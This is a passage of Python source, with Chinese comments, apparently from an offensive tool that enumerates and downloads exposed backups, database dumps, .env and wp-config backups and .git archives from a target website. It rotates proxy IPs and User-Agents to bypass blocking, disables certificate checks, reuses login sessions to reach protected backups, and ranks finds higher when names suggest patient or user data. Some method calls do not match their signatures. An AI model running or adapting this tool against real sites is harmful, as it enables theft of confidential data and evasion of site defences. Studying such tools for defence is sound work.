        if self.detected_tech_stack['language'] == 'php':
            base_names.extend([
                'phpmyadmin', 'pma', 'mysql', 'mysqldump',
                'laravel', 'symfony', 'codeigniter', 'yii'
            ])
        elif self.detected_tech_stack['language'] == 'java':
            base_names.extend([
                'tomcat', 'spring', 'hibernate', 'mybatis',
                'maven', 'gradle', 'war', 'jar'
            ])
        elif self.detected_tech_stack['language'] == '.net':
            base_names.extend([
                'aspnet', 'iis', 'sqlserver', 'mssql',
                'webapp', 'webconfig', 'bin'
            ])
        
        # 3. 基于CMS的专用名称
        if self.detected_tech_stack['cms'] == 'wordpress':
            base_names.extend([
                'wordpress', 'wp', 'wp-content', 'wp-config',
                'woocommerce', 'plugins', 'themes', 'uploads'
            ])
        elif self.detected_tech_stack['cms'] == 'drupal':
            base_names.extend([
                'drupal', 'sites', 'modules', 'themes', 'files'
            ])
        
        # 4. 智能时间格式生成
        today = datetime.now()
        date_formats = []
        
        # 智能时间轴：近期密集，远期稀疏
        critical_days = [0, 1, 2, 3, 7, 14, 30, 60, 90, 180, 365, 730]
        for days_ago in critical_days:
            date = today - timedelta(days=days_ago)
            date_formats.extend([
                date.strftime('%Y%m%d'),      # 20231201
                date.strftime('%Y-%m-%d'),    # 2023-12-01
                date.strftime('%Y_%m_%d'),    # 2023_12_01
                date.strftime('%Y.%m.%d'),    # 2023.12.01
                date.strftime('%y%m%d'),      # 231201
                date.strftime('%Y%m'),        # 202312
                date.strftime('%Y'),          # 2023
                date.strftime('%m%d'),        # 1201
            ])
        
        # 季度和周期性备份
        for quarter in ['Q1', 'Q2', 'Q3', 'Q4']:
            date_formats.append(f"{today.year}_{quarter}")
        
        # 特殊时间标识
        date_formats.extend([
            'latest', 'newest', 'current', 'today', 'yesterday',
            'daily', 'weekly', 'monthly', 'yearly', 'quarterly',
            'old', 'new', 'temp', 'tmp', 'test', 'prod', 'production',
            'dev', 'development', 'staging', 'beta', 'alpha'
        ])
        
        # 5. 扩展名（增强版）
        extensions = [
            # SQL相关
            '.sql', '.sql.gz', '.sql.bz2', '.sql.zip', '.sql.tar', '.sql.tar.gz',
            '.sql.7z', '.sql.xz', '.mysql', '.mysqldump',
            
            # 数据库文件
            '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb',
            '.frm', '.ibd', '.ibdata', '.dbf',
            
            # 压缩档案
            '.zip', '.tar', '.tar.gz', '.tgz', '.tar.bz2', '.tar.xz',
            '.7z', '.rar', '.gz', '.bz2', '.xz',
            
            # 备份标识
            '.bak', '.backup', '.old', '.save', '.dump', '.arc', '.archive',
            '.copy', '.orig', '.tmp', '.temp',
            
            # 数据格式
            '.csv', '.xls', '.xlsx', '.json', '.xml', '.yaml', '.yml',
            '.txt', '.log', '.dat', '.bin'
        ]
        
        # 6. 组合生成文件名
        for base in base_names:
            # 不带日期的基础组合
            for ext in extensions:
                patterns.add(base + ext)
                patterns.add(base + '_backup' + ext)
                patterns.add(base + '_bak' + ext)
                patterns.add(base + '_dump' + ext)
                patterns.add(base + '_export' + ext)
                patterns.add(base + '_copy' + ext)
                
            # 带日期的组合（限制数量避免爆炸）
            for date in date_formats[:25]:  
                for ext in extensions[:15]:  # 只使用常见扩展名
                    patterns.add(f"{base}_{date}{ext}")
                    patterns.add(f"{base}-{date}{ext}")
                    patterns.add(f"{base}.{date}{ext}")
                    patterns.add(f"{date}_{base}{ext}")
                    patterns.add(f"{date}-{base}{ext}")
                    
        # 7. 框架和技术栈特定模式
        tech_patterns = []
        
        if self.detected_tech_stack['cms'] == 'wordpress':
            tech_patterns.extend([
                'wp-content/uploads/backup-*.zip',
            'wp-content/updraft/*.zip',
                'wp-content/backwpup-*.zip',
                'wp-admin/backup/*.sql',
                'wp-config.php.bak',
                'wp-config.bak'
            ])
        
        if self.detected_tech_stack['language'] == 'php':
            tech_patterns.extend([
                'phpmyadmin/backup/*.sql',
                'adminer.php.bak',
                'config.php.bak',
                '.env.backup',
                'composer.lock.bak'
            ])
        
        if self.detected_tech_stack['framework'] == 'laravel':
            tech_patterns.extend([
                'storage/app/backup/*.zip',
                'storage/logs/backup/*.log',
                '.env.backup',
                'artisan.bak'
            ])
        
        # 8. 版本控制备份
        vcs_patterns = [
            '.git.tar.gz', '.git.zip', '.git.7z',
            '.svn.tar.gz', '.svn.zip',
            '.hg.tar.gz', '.bzr.tar.gz',
            'git-backup.zip', 'svn-backup.zip',
            'repository.zip', 'source.zip',
            'code.zip', 'project.zip'
        ]
        
        # 9. 容器和云原生备份
        container_patterns = [
            'docker-compose.yml.bak',
            'Dockerfile.bak',
            'k8s-config.yaml.bak',
            'kubernetes.yaml.bak',
            'helm-values.yaml.bak',
            'docker-backup.tar.gz',
            'container-backup.zip'
        ]
        
        # 10. 配置和环境文件备份
        config_patterns = [
            '.env.backup', '.env.bak', '.env.old',
            'config.php.bak', 'config.yml.bak',
            'settings.php.bak', 'local.php.bak',
            'database.php.bak', 'app.php.bak',
            'web.config.bak', 'httpd.conf.bak',
            'nginx.conf.bak', 'apache2.conf.bak'
        ]
        
        # 合并所有模式
        patterns.update(tech_patterns)
        patterns.update(vcs_patterns)
        patterns.update(container_patterns)
        patterns.update(config_patterns)
        
        # 转换为列表并去重
        self.intelligent_patterns = list(patterns)
        self.pattern_generation_completed = True
        
        print(f"    生成了 {len(self.intelligent_patterns)} 个智能备份模式")
        return self.intelligent_patterns

    def is_backup_noise(self, url, content_type='', content_length=0):
        """智能噪音检测 - 识别假阳性备份"""
        filename = os.path.basename(urlparse(url).path).lower()
        
        # 1. 第三方库和框架的备份文件（通常是噪音）
        third_party_indicators = [
            'jquery', 'bootstrap', 'angular', 'react', 'vue',
            'fontawesome', 'font-awesome', 'material-design',
            'googleapis', 'googleapi', 'cdnjs', 'jsdelivr',
            'unpkg', 'cloudflare', 'amazon', 'microsoft'
        ]
        
        for indicator in third_party_indicators:
            if indicator in filename:
                return True, f"第三方库备份: {indicator}"
        
        # 2. 使用噪音过滤器（如果可用）
        if NOISE_FILTER_AVAILABLE:
            if is_third_party(url):
                if not has_security_value(url):
                    return True, "第三方服务噪音"
        
        # 3. 文件大小检测（太小可能是错误页面）
        if content_length > 0 and content_length < 100:
            return True, f"文件过小: {content_length}字节"
        
        # 4. 明显的测试或示例文件
        test_indicators = [
            'test', 'demo', 'sample', 'example', 'readme',
            'install', 'setup', 'default', 'template'
        ]
        
        for indicator in test_indicators:
            if indicator in filename and 'backup' not in filename:
                return True, f"测试/示例文件: {indicator}"
        
        # 5. 空文件或错误页面检测
        if content_type and 'text/html' in content_type and content_length < 1000:
            return True, "可能是错误页面"
        
        return False, "正常备份"

    async def get_enhanced_session(self):
        """获取增强会话 - 动态IP + User-Agent 组合拳（备份挖掘版）"""
        if self.use_dynamic_ip and self.dynamic_ip_initialized:
            # === 终极组合模式：动态IP + User-Agent ===
            ip = self.get_current_ip()
            if ip:
                # 创建带代理的增强会话
                headers = self.bypass_enhancer.generate_realistic_headers()
                
                # SSL配置（忽略证书错误，适合备份挖掘）
                ssl_context = ssl.create_default_context(cafile=certifi.where())
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                connector = aiohttp.TCPConnector(
                    ssl=ssl_context,
                    limit=100,
                    ttl_dns_cache=300,
                    use_dns_cache=True,
                )
                
                timeout = aiohttp.ClientTimeout(total=30, connect=10)
                proxy_url = f'http://{ip}'
                
                session = aiohttp.ClientSession(
                    connector=connector,
                    timeout=timeout,
                    headers=headers
                )
                
                # 设置代理
                session._proxy = proxy_url
                return session
            else:
                print("[!] 动态IP获取失败，回退到User-Agent绕过模式")
                if DYNAMIC_IP_AVAILABLE:
                    force_switch_ip()  # 强制切换IP
        
        # 使用User-Agent绕过模式
        if self.use_user_agent:
            return await self.bypass_enhancer.create_enhanced_session()
        else:
            # 基础会话
            return await self._create_basic_session()
    
    def get_current_ip(self):
        """获取当前动态IP"""
        try:
            # 直接调用全局IP池
            if DYNAMIC_IP_AVAILABLE and _global_ip_pool:
                if hasattr(_global_ip_pool, 'working_ips') and _global_ip_pool.working_ips:
                    return _global_ip_pool.get_random_ip()
        except:
            pass
        return None

    async def _create_session(self):
        """创建统一的HTTP session - 支持认证和绕过增强"""
        if self.session and not self.session.closed:
            return self.session
        
        # 使用增强会话（如果启用）
        if self.use_dynamic_ip or self.use_user_agent:
            self.session = await self.get_enhanced_session()
        else:
            self.session = await self._create_basic_session()
        
        return self.session
    
    async def _create_basic_session(self):
        """创建基础session（回退模式）"""
        # SSL配置（忽略证书错误，适合备份挖掘）
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(ssl=ssl_context)
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        return aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        )

    async def _safe_request(self, method: str, url: str, **kwargs):
        """安全的HTTP请求 - 支持绕过增强 + 认证管理器"""
        # 如果启用了认证管理器，为请求添加认证信息
        if self.auth_manager:
            try:
                kwargs = await self.auth_manager.prepare_request(url, **kwargs)
            except Exception as e:
                print(f"认证 认证准备失败: {e}")
        
        try:
            # 使用增强会话（动态IP + User-Agent）
            if self.use_dynamic_ip or self.use_user_agent:
                async with await self.get_enhanced_session() as enhanced_session:
                    response = await enhanced_session.request(method, url, **kwargs)
                    
                    # 更新绕过统计
                    self.bypass_enhancer.bypass_stats['requests_made'] += 1
                    
                    # 检查认证状态
                    if self.auth_manager:
                        auth_ok = await self.auth_manager.handle_response(response, url)
                        if not auth_ok and self.auth_manager.should_retry(response):
                            # 认证失效，尝试恢复
                            print("[!] 检测到认证失效，尝试恢复...")
                            await response.release()  # 释放连接
                            
                            recovery_success = await self.auth_manager._recover_authentication()
                            if recovery_success:
                                # 重新准备请求
                                kwargs = await self.auth_manager.prepare_request(url, **kwargs)
                                # 重试请求
                                response = await enhanced_session.request(method, url, **kwargs)
                    
                    return response
            else:
                # 使用标准session
                if not self.session:
                    await self._create_session()
                
                response = await self.session.request(method, url, **kwargs)
                
                # 检查认证状态
                if self.auth_manager:
                    auth_ok = await self.auth_manager.handle_response(response, url)
                    if not auth_ok and self.auth_manager.should_retry(response):
                        # 认证失效，尝试恢复
                        print("[!] 检测到认证失效，尝试恢复...")
                        await response.release()  # 释放连接
                        
                        recovery_success = await self.auth_manager._recover_authentication()
                        if recovery_success:
                            # 重新准备请求
                            kwargs = await self.auth_manager.prepare_request(url, **kwargs)
                            # 重试请求
                            response = await self.session.request(method, url, **kwargs)
                
                return response
            
        except Exception as e:
            print(f"请求异常: {e}")
            return None

    async def _cleanup_session(self):
        """清理session资源"""
        if self.session and not self.session.closed:
            await self.session.close()
        
        if self.auth_manager:
            try:
                await self.auth_manager.cleanup()
            except Exception as e:
                print(f"认证 认证管理器清理异常: {e}")

    async def run(self):
        """主执行函数 - 智能化升级版 + 认证支持"""
        print(f"[*] 开始智能化备份文件挖掘: {self.target_url}")
        print(f"[*] 时间: {datetime.now()}")
        noise_status = "OK 启用" if NOISE_FILTER_AVAILABLE else "错误 禁用"
        auth_status = "认证OK" if self.auth_manager else " "
        print(f"[*] 噪音过滤: {noise_status}")
        print(f"[*] 认证管理: {auth_status}")
        
        # 显示绕过模式
        if self.use_dynamic_ip:
            print(f"[*] 绕过模式: 终极组合拳 (动态IP + User-Agent + 智能请求头)")
        elif self.use_user_agent:
            print(f"[*] 绕过模式: User-Agent轮换 + 智能请求头")
        else:
            print(f"[*] 绕过模式: 基础模式")
        
        try:
            # 初始化动态IP池
            if self.use_dynamic_ip:
                print("[+] 初始化动态IP池...")
                try:
                    if await init_ip_pool():
                        self.dynamic_ip_initialized = True
                        print("[+] 动态IP池初始化成功!")
                    else:
                        print("[!] 动态IP池初始化失败，回退到User-Agent模式")
                        self.use_dynamic_ip = False
                except Exception as e:
                    print(f"[!] 动态IP池初始化异常: {e}")
                    self.use_dynamic_ip = False
            
            # 创建输出目录
            os.makedirs(self.output_dir, exist_ok=True)
            
            # 初始化组件
            await self._create_session()
            
            # 初始化认证管理器
            if self.auth_manager:
                await self.auth_manager.initialize()
                print("认证 认证管理器初始化完成 - 准备访问认证后备份金矿")
                
                # 显示认证统计
                auth_stats = self.auth_manager.get_auth_stats()
                auth_type = auth_stats.get('current_auth_type', 'unknown')
                print(f"认证 认证类型: {auth_type}")
            
            # 0. 技术栈检测（新增）
            await self.detect_tech_stack()
            
            # 0.5. 建立WAF欺骗检测基线（新增）
            async with aiohttp.ClientSession() as session:
                await self.baseline_detector.establish_baselines(session)
            
            # 1. 生成智能备份模式（新增）
            self.intelligent_patterns = self.generate_intelligent_patterns()
            print(f"[*] 智能模式数量: {len(self.intelligent_patterns)}")
            
            # 显示基线检测能力
            baseline_info = self.baseline_detector.get_baseline_info()
            print(f"[*] WAF欺骗检测基线: {baseline_info['baselines_count']}个基线已建立")
            if baseline_info['detection_capabilities']:
                print(f"    检测能力: {', '.join(baseline_info['detection_capabilities'])}")
            
            # 2. 智能探测备份文件（增强版）
            await self.smart_backup_discovery_enhanced()
            
            # 3. 深度目录发现（新增）
            await self.deep_directory_discovery()
            
            # 4. 暴力枚举备份文件（智能版）
            await self.intelligent_brute_force()
            
            # 5. 版本控制备份发现（新增）
            await self.discover_vcs_backups()
            
            # 6. 时间轴相关备份发现（新增）
            await self.timeline_based_discovery()
            
            # 7. 智能下载备份文件（增强版）
            await self.smart_download_backups()
            
            # 8. 深度分析备份内容（增强版）
            await self.deep_analyze_backups()
            
            # 9. 生成智能报告
            self.generate_smart_report()
            
            return self.found_backups
            
        except Exception as e:
            print(f"[!] 备份挖掘异常: {e}")
            raise
        finally:
            # 清理资源
            await self._cleanup_session()

    async def smart_backup_discovery_enhanced(self):
        """增强版智能发现备份文件 - 集成噪音过滤 + 认证支持"""
        print("[+] 增强版智能探测备份文件...")
        
        # 使用统一的session管理（支持认证）
        # 1. 检查robots.txt和sitemap
        await self.check_robots_and_sitemap()
        
        # 2. 检查常见备份路径（智能版）
        await self.check_common_paths_smart()
        
        # 3. 目录遍历（增强版）
        await self.directory_listing_enhanced()
        
        # 4. 检查HTTP headers和指纹
        await self.check_headers_and_fingerprint()
        
        # 5. 检查错误页面泄露
        await self.check_error_page_leaks()

    async def deep_directory_discovery(self):
        """深度目录发现 - 基于响应时间和模式推测"""
        print("[+] 深度目录发现...")
        
        # 使用系统代理设置
        async with aiohttp.ClientSession() as session:
            # 基于已发现的路径推测相似路径
            discovered_paths = set()
            
            # 从已知目录推测
            for backup_dir in self.backup_dirs[:10]:  # 限制数量
                potential_paths = self._generate_similar_paths(backup_dir)
                
                # 批量测试
                tasks = []
                for path in potential_paths[:20]:
                    tasks.append(self._test_directory_existence(session, path))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if result and not isinstance(result, Exception):
                        discovered_paths.add(result)
                        print(f"    发现目录: {result}")
            
            # 添加到备份目录列表
            self.backup_dirs.extend(list(discovered_paths))

    def _generate_similar_paths(self, base_path):
        """生成相似路径"""
        similar_paths = []
        base = base_path.strip('/')
        
        # 变体生成
        variations = [
            base + 's',           # backup -> backups
            base[:-1] if base.endswith('s') else base,  # backups -> backup
            base + '_files',      # backup -> backup_files
            base + '_data',       # backup -> backup_data
            base.replace('_', '-'), # backup_files -> backup-files
            base.replace('-', '_'), # backup-files -> backup_files
        ]
        
        for var in variations:
            similar_paths.append(f'/{var}/')
            similar_paths.append(f'/.{var}/')   # 隐藏目录
            similar_paths.append(f'/_{var}/')   # 下划线前缀
        
        return similar_paths

    async def _test_directory_existence(self, session, path):
        """测试目录是否存在"""
        url = urljoin(self.target_url, path)
        
        try:
            async with session.head(url, timeout=5) as resp:
                # 目录存在的迹象
                if resp.status in [200, 301, 302, 403]:
                    return path
        except Exception:
            pass
        
        return None

    async def intelligent_brute_force(self):
        """智能暴力枚举 - 基于技术栈和优先级，集成智能速率控制"""
        print("[+] 智能暴力枚举备份文件...")
        
        # 使用系统代理设置，保留动态连接限制
        conn_limit = aiohttp.TCPConnector(limit=self.rate_controller.max_concurrency)
        
        async with aiohttp.ClientSession(connector=conn_limit) as session:
            # 按优先级排序模式
            prioritized_patterns = self._prioritize_patterns()
            
            # 动态批次大小，基于服务器健康状态
            base_batch_size = 30
            health_multiplier = {
                'healthy': 1.5,
                'normal': 1.0,
                'stressed': 0.6,
                'overloaded': 0.3
            }
            
            batch_size = int(base_batch_size * health_multiplier.get(self.rate_controller.server_health, 1.0))
            batch_size = max(10, min(100, batch_size))  # 限制在10-100之间
            
            print(f"    动态批次大小: {batch_size} (服务器状态: {self.rate_controller.server_health})")
            
            for i in range(0, len(prioritized_patterns), batch_size):
                batch = prioritized_patterns[i:i+batch_size]
                
                # 获取当前最优并发控制
                semaphore = await self.rate_controller.get_optimal_semaphore()
                
                tasks = []
                for pattern in batch:
                    for directory in self.backup_dirs[:12]:  # 适度减少目录数量
                        url = urljoin(self.target_url, directory.strip('/') + '/' + pattern)
                        tasks.append(self.check_backup_exists_smart(session, url, semaphore))
                
                print(f"    测试批次 {i//batch_size + 1}: {len(tasks)} 个路径 "
                      f"(并发: {semaphore._value})")
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                batch_found = 0
                for result in results:
                    if result and not isinstance(result, Exception):
                        self.found_backups.append(result)
                        batch_found += 1
                
                if batch_found > 0:
                    print(f"      本批次发现 {batch_found} 个备份文件")
                
                # 如果找到备份，测试相似模式
                if self.found_backups and i == 0:  # 只在第一批后测试
                    await self.test_similar_patterns_enhanced(session)
                
                # 显示速率控制状态
                if i % (batch_size * 3) == 0 and i > 0:  # 每3个批次显示一次
                    stats = self.rate_controller.get_stats()
                    print(f"    速率控制状态: 并发={stats['current_concurrency']}, "
                          f"延迟={stats['current_delay']:.2f}s, "
                          f"错误率={stats['error_rate']:.1%}")

    def _prioritize_patterns(self):
        """按价值和概率对模式进行优先级排序"""
        high_priority = []
        medium_priority = []
        low_priority = []
        
        for pattern in self.intelligent_patterns:
            # 高优先级：包含数据库关键词
            if any(keyword in pattern.lower() for keyword in self.db_keywords[:10]):
                high_priority.append(pattern)
            # 中优先级：技术栈相关
            elif any(tech in pattern.lower() for tech in [
                self.detected_tech_stack['language'],
                self.detected_tech_stack['cms'],
                self.detected_tech_stack['framework']
            ]):
                medium_priority.append(pattern)
            # 低优先级：其他
            else:
                low_priority.append(pattern)
        
        # 返回排序后的列表
        return high_priority + medium_priority + low_priority[:200]  # 限制总数

    async def test_similar_patterns_enhanced(self, session):
        """增强版相似模式测试"""
        print("    测试相似备份模式...")
        
        # 基于已找到的备份生成相似模式
        similar_patterns = []
        
        for backup in self.found_backups:
            filename = backup['filename']
            base_name = filename.split('.')[0]
            
            # 提取日期模式
            date_match = re.search(r'(\d{4}[-_]?\d{2}[-_]?\d{2}|\d{6,8})', filename)
            if date_match:
                date_str = date_match.group(1)
                
                # 生成前后几天的日期
                try:
                    # 尝试解析日期
                    if '-' in date_str:
                        date_obj = datetime.strptime(date_str, '%Y-%m-%d')
                    elif '_' in date_str:
                        date_obj = datetime.strptime(date_str, '%Y_%m_%d')
                    else:
                        date_obj = datetime.strptime(date_str[:8], '%Y%m%d')
                        
                    # 生成前后7天
                    for days in range(-7, 8):
                        new_date = date_obj + timedelta(days=days)
                        new_filename = filename.replace(date_str, new_date.strftime('%Y%m%d'))
                        similar_patterns.append(new_filename)
                        
                except Exception:
                    continue
        
        # 测试相似模式
        if similar_patterns:
            tasks = []
            for pattern in similar_patterns[:30]:  # 限制数量
                url = urljoin(self.target_url, pattern)
                tasks.append(self.check_backup_exists_smart(session, url))
                
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            new_finds = 0
            for result in results:
                if result and not isinstance(result, Exception):
                    self.found_backups.append(result)
                    new_finds += 1
            
            if new_finds > 0:
                print(f"      发现 {new_finds} 个相似备份")

    async def discover_vcs_backups(self):
        """版本控制备份发现"""
        print("[+] 版本控制备份发现...")
        
        # 使用系统代理设置
        async with aiohttp.ClientSession() as session:
            vcs_patterns = [
                # Git相关
                '.git', '.git/', '.git/config', '.git/HEAD', '.git/logs/',
                '.git.zip', '.git.tar.gz', '.git.7z',
                'git-backup.zip', 'git-export.zip',
                
                # SVN相关
                '.svn', '.svn/', '.svn/entries', '.svn/wc.db',
                '.svn.zip', '.svn.tar.gz',
                'svn-backup.zip', 'svn-export.zip',
                
                # 其他版本控制
                '.hg', '.bzr', '_darcs',
                'repository.zip', 'source-code.zip', 'project.zip'
            ]
            
            tasks = []
            for pattern in vcs_patterns:
                url = urljoin(self.target_url, pattern)
                tasks.append(self.check_backup_exists_smart(session, url))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if result and not isinstance(result, Exception):
                    result['type'] = 'version_control'
                    self.found_backups.append(result)
                    print(f"    发现版本控制备份: {result['filename']}")

    async def timeline_based_discovery(self):
        """基于时间轴的备份发现"""
        print("[+] 时间轴相关备份发现...")
        
        # 基于重要时间节点生成备份
        important_dates = self._generate_important_dates()
        
        # 使用系统代理设置
        async with aiohttp.ClientSession() as session:
            tasks = []
            
            for date_str in important_dates[:30]:  # 限制数量
                # 生成该日期的备份文件名
                date_patterns = [
                    f'backup_{date_str}.sql',
                    f'backup_{date_str}.zip',
                    f'dump_{date_str}.sql',
                    f'database_{date_str}.sql',
                    f'{date_str}_backup.sql',
                    f'{date_str}_dump.sql'
                ]
                
                for pattern in date_patterns:
                    for directory in ['/backup/', '/dump/', '/']:
                        url = urljoin(self.target_url, directory + pattern)
                        tasks.append(self.check_backup_exists_smart(session, url))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if result and not isinstance(result, Exception):
                    result['discovery_method'] = 'timeline_based'
                    self.found_backups.append(result)

    def _generate_important_dates(self):
        """生成重要时间节点"""
        important_dates = []
        today = datetime.now()
        
        # 月末/季末/年末备份
        for year in [today.year, today.year - 1]:
            # 年末
            important_dates.append(f'{year}1231')
            important_dates.append(f'{year}-12-31')
            
            # 季度末
            for quarter_end in ['0331', '0630', '0930', '1231']:
                important_dates.append(f'{year}{quarter_end}')
                important_dates.append(f'{year}-{quarter_end[:2]}-{quarter_end[2:]}')
        
        # 周末备份（最近几个周日）
        current_date = today
        for _ in range(12):  # 最近12个周日
            if current_date.weekday() == 6:  # 周日
                important_dates.append(current_date.strftime('%Y%m%d'))
                important_dates.append(current_date.strftime('%Y-%m-%d'))
            current_date -= timedelta(days=1)
        
        return important_dates

    async def check_robots_and_sitemap(self, session):
        """检查robots.txt和sitemap中的备份线索"""
        # 检查robots.txt
        try:
            url = urljoin(self.target_url, '/robots.txt')
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # 查找Disallow的备份目录
                    disallow_patterns = re.findall(r'Disallow:\s*([^\s]+)', content, re.I)
                    for pattern in disallow_patterns:
                        if any(keyword in pattern.lower() for keyword in ['backup', 'bak', 'dump', 'old', 'temp']):
                            print(f"    robots.txt发现备份目录: {pattern}")
                            self.backup_dirs.append(pattern)
                            
        except Exception as e:
            pass
        
        # 检查sitemap.xml
        sitemap_urls = ['/sitemap.xml', '/sitemap_index.xml', '/sitemap.txt']
        for sitemap_path in sitemap_urls:
            try:
                sitemap_url = urljoin(self.target_url, sitemap_path)
                async with session.get(sitemap_url, timeout=10) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        
                        # 提取URL路径中的备份相关
                        url_paths = re.findall(r'<loc>([^<]+)</loc>', content, re.I)
                        for url_path in url_paths:
                            parsed = urlparse(url_path)
                            if any(keyword in parsed.path.lower() for keyword in ['backup', 'download', 'export']):
                                print(f"    sitemap发现备份相关路径: {parsed.path}")
                                self.backup_dirs.append(os.path.dirname(parsed.path) + '/')
                                
            except Exception:
                continue

    async def check_common_paths_smart(self, session):
        """智能检查常见备份路径 - 集成噪音过滤"""
        print("[+] 智能检查常见备份路径...")
        
        # 高概率备份路径（按技术栈优化）
        quick_checks = [
            '/backup.sql', '/dump.sql', '/database.sql', '/db.sql',
            '/backup.zip', '/backup.tar.gz', '/site.zip', '/www.zip',
            '/backup/', '/backups/', '/dump/', '/dumps/',
            '/.git.tar.gz', '/.env.backup', '/config.php.bak'
        ]
        
        # 基于技术栈添加特定路径
        if self.detected_tech_stack['cms'] == 'wordpress':
            quick_checks.extend([
                '/wp-content/backup.zip',
                '/wp-content/uploads/backup.zip',
                '/wp-config.php.bak'
            ])
        elif self.detected_tech_stack['language'] == 'php':
            quick_checks.extend([
                '/phpmyadmin/backup.sql',
                '/config.php.bak',
                '/database.php.bak'
            ])
        
        # 批量测试
        semaphore = asyncio.Semaphore(10)  # 控制并发
        tasks = []
        
        for path in quick_checks:
            url = urljoin(self.target_url, path)
            tasks.append(self.check_backup_exists_smart(session, url, semaphore))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result and not isinstance(result, Exception):
                self.found_backups.append(result)
                print(f"    发现常见路径备份: {result['filename']}")

    async def check_backup_exists_smart(self, session, url, semaphore=None):
        """智能检查备份文件是否存在 - 集成噪音过滤"""
        if semaphore:
            async with semaphore:
                return await self._do_backup_check(session, url)
        else:
            return await self._do_backup_check(session, url)

    async def _do_backup_check(self, session, url):
        """执行实际的备份检查 - 集成智能速率控制"""
        # 智能速率控制 - 获取请求槽位
        await self.rate_controller.acquire_request_slot()
        
        self.download_stats['total_requests'] += 1
        start_time = datetime.now()
        
        try:
            # 对于可能的200响应，使用GET请求获取完整内容进行WAF欺骗检测
            # 对于其他情况，使用HEAD请求节省带宽
            request_method = 'GET'  # 默认使用GET以进行内容分析
            
            async with session.get(url, timeout=8, allow_redirects=False) as resp:
                # 记录响应时间和状态
                response_time = (datetime.now() - start_time).total_seconds()
                
                if resp.status == 200:
                    content = await resp.text()
                    content_length = len(content.encode('utf-8'))
                    content_type = resp.headers.get('Content-Type', '')
                    
                    # WAF欺骗检测 - 关键新增功能
                    is_deception, deception_reason = await self.deception_detector.analyze_response(
                        url, resp.status, content, resp.headers
                    )
                    
                    if is_deception:
                        # 检测到WAF欺骗，记录为失败请求
                        await self.rate_controller.record_response(response_time, resp.status, False)
                        print(f"      WAF欺骗检测: {os.path.basename(urlparse(url).path)} ({deception_reason})")
                        return None
                    
                    # 正常记录成功响应
                    await self.rate_controller.record_response(response_time, resp.status, True)
                    
                    # 智能噪音检测
                    is_noise, noise_reason = self.is_backup_noise(url, content_type, content_length)
                    if is_noise:
                        self.noise_stats['noise_filtered'] += 1
                        print(f"      过滤噪音: {os.path.basename(urlparse(url).path)} ({noise_reason})")
                        return None
                    
                    # 检查文件大小和类型
                    if content_length > 500:  # 大于500字节
                        backup_info = {
                            'url': url,
                            'size': content_length,
                            'type': content_type,
                            'filename': os.path.basename(urlparse(url).path),
                            'found_time': datetime.now().isoformat(),
                            'discovery_method': 'smart_enumeration',
                            'value_score': self._calculate_backup_value(url, content_length, content_type),
                            'waf_check_passed': True  # 标记通过了WAF欺骗检测
                        }
                        
                        self.noise_stats['valuable_backups'] += 1
                        print(f"    发现合法备份文件: {backup_info['filename']}")
                        print(f"      大小: {self.format_size(content_length)}")
                        print(f"      价值评分: {backup_info['value_score']}")
                        
                        return backup_info
                        
                elif resp.status == 403:
                    # 403也说明文件存在，只是无权访问
                    await self.rate_controller.record_response(response_time, resp.status, True)
                    print(f"    备份文件存在但无权访问: {os.path.basename(urlparse(url).path)}")
                    
                else:
                    # 其他状态码
                    await self.rate_controller.record_response(response_time, resp.status, False)
                    
        except Exception as e:
            # 记录失败的请求
            response_time = (datetime.now() - start_time).total_seconds()
            await self.rate_controller.record_response(response_time, 0, False)
        
        return None

    def _calculate_backup_value(self, url, content_length, content_type):
        """计算备份文件的价值评分"""
        score = 0
        filename = os.path.basename(urlparse(url).path).lower()
        
        # 文件大小评分
        if content_length > 10 * 1024 * 1024:  # 10MB以上
            score += 50
        elif content_length > 1024 * 1024:  # 1MB以上
            score += 30
        elif content_length > 100 * 1024:  # 100KB以上
            score += 20
        else:
            score += 10
        
        # 文件类型评分
        if any(ext in filename for ext in ['.sql', '.dump', '.db']):
            score += 40  # 数据库备份最高分
        elif any(ext in filename for ext in ['.zip', '.tar.gz', '.7z']):
            score += 30  # 压缩包次之
        elif any(ext in filename for ext in ['.bak', '.backup', '.old']):
            score += 25  # 备份文件
        
        # 关键词评分
        for keyword in self.db_keywords[:10]:  # 只检查高价值关键词
            if keyword in filename:
                score += 20
        
        # 敏感词额外加分
        sensitive_words = ['patient', 'user', 'admin', 'database', 'full', 'complete']
        for word in sensitive_words:
            if word in filename:
                score += 15
        
        return min(score, 100)  # 最高100分

    async def directory_listing_enhanced(self, session):
        """增强版目录列表检查 - 深度分析"""
        print("[+] 增强版目录列表检查...")
        
        for directory in self.backup_dirs[:25]:  # 增加检查数量
            url = urljoin(self.target_url, directory)
            
            try:
                async with session.get(url, timeout=15) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        
                        # 检查是否是目录列表
                        if ('Index of' in content or 'Directory listing' in content or 
                            '<title>Index of' in content or 'Parent Directory' in content):
                            print(f"    发现目录列表: {url}")
                            
                            # 使用更精确的正则提取文件链接
                            patterns = [
                                r'href=["\']([^"\']+\.(?:sql|zip|tar|gz|bak|dump|backup|old|save)[^"\']*)["\']',
                                r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>([^<]*\.(?:sql|zip|tar|gz|bak|dump))',
                                r'>([^<]*\.(?:sql|zip|tar|gz|bak|dump|backup)[^<]*)</a>'
                            ]
                            
                            found_files = set()
